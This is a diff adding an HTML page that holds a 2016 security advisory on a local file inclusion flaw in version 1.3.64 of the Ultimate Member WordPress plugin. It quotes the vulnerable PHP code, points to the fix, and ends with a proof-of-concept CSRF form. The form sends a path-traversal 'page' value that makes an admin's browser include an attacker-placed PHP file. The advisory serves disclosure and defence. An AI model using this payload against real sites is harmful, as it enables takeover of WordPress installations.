@@ -1,0 +1,63 @@
+<html> 
+<head> 
+<title>Advisory - Burak Kelebek</title> 
+<link rel="stylesheet" type="text/css" href="../style.css">
+<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=sunburst"></script>
+
+<body> 
+<div id="console"> 
+<center>
+<ul id="menu">
+  <li><a id="c" href="../index.html">Home</a></li>
+  |
+  <li><a id="c" href="../blog.html">Blog</a></li>
+  |
+  <li><a id="c" href="../advisory.html">Advisories</a></li>
+  |
+  <li><a id="c" href="../contact.html">Contact</a></li>
+</ul></center>
+
+<title>Ultimate Member Local File Inclusion vulnerability - Security Advisories and Insights</title>
+
+<p class="meta">Burak Kelebek, July 2016</p>
+<h1 class="title">Ultimate Member Local File Inclusion vulnerability</h1>
+<p></p>
+<h3>-- Abstract</h3>
+<p>It was discovered that <a href="https://wordpress.org/plugins/ultimate-member/">Ultimate Member</a> is vulnerable to <a href="https://www.owasp.org/index.php/PHP_File_Inclusion">PHP File Inclusion</a>. In order to exploit this issue an attacker must be able to place an arbitrary PHP file on the target system. Afterwards the attacker needs to lure an authenticated admin to visit a malicious page. Through CSRF the attacker could compromise WordPress, by executing the malicious PHP file.</p>
+<h3>-- Tested versions</h3>
+<p>This issue was succesfully tested on the <a href="https://wordpress.org/plugins/ultimate-member/">Ultimate Member</a> WordPress plugin version 1.3.64.</p>
+<h3>-- Fix</h3>
+<p>There is a fix available in Pre-released version: <a href="https://github.com/ultimatemember/ultimatemember/commit/50f5828ac7fa08a1afa0a52b456a1db49071c804">pre-v1.3.65.10</a>. After the fix is applied user input is no more used when including local files in WordPress.</p>
+<h3>-- Introduction</h3>
+<p>The File Inclusion vulnerability allows an attacker to include a file,  exploiting a "dynamic file inclusion" mechanisms implemented in the Ultimate Member plugin of WordPress. </p>
+<h3>-- Details</h3>
+<p>The vulnerability occurs due to the use of user-supplied input in the 'page' parameter without proper validation.  
+The code first checks if 'ultimatemember-' exists in page parameter supplied by user. If it exists it deletes 'ultimatemember-' and assigns user input to the template parameter. Lastly it inserts user input in the PHP function <a href="http://php.net/manual/en/function.include-once.php">include_once</a>.</p>
+<p>ultimate-member/admin/core/um-admin-dashboard.php:</p>
+<p><code><pre class="prettyprint">$page = $_REQUEST['page'];
+[..]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if ( strstr( $page, 'ultimatemember-' ) ) {
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$template = str_replace('ultimatemember-','',$page);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$file = um_path . 'admin/templates/welcome/'. $template . '.php';
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( file_exists( $file ) ){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include_once um_path . 'admin/templates/welcome/'. $template . '.php';
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</code>&nbsp;&nbsp;&nbsp;</p></pre>
+<h3>-- Proof of concept</h3>
+<p>Proof of Concept below simply opens a file in the temp folder of WordPress.</p>
+<p><code class=prettyprint>&lt;html&gt;
+&lt;body&gt;
+&lt;form action="http://&lt;target&gt;/wp-admin/admin.php?page=ultimatemember" method="POST"&gt;
+;&lt;input type="hidden" name="page" value="ultimatemember-../../../../../uploads/ultimatemember/temp/<br>dZm2Sr1IbnIy4Ikn3FbWdMlOh2wCzDu3KunD4tIk/stream_photo_697d3db4eba7e7254670210e3c095022_5779a47985512" /&gt;
+&lt;input type="submit" value="Submit request" /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></p>
+<p>I originally wrote this article for Securify B.V.<a href="https://securify.nl/en/advisory/SFY20160709/ultimate-member-local-file-inclusion-vulnerability.html"> Read more.</a></p> 			</div>
+		</div>
+
+</div></body></head></html>
